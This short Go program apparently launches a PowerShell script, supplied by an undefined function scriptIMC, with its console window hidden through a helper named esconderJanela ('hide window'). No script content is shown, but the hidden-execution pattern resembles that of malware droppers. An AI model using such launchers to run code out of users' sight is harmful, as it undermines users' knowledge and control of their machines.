package main

import (
	"os/exec"
)

func main() {
	cmd := exec.Command("powershell", "-Command", scriptIMC())
	esconderJanela(cmd)
	cmd.Run()
}
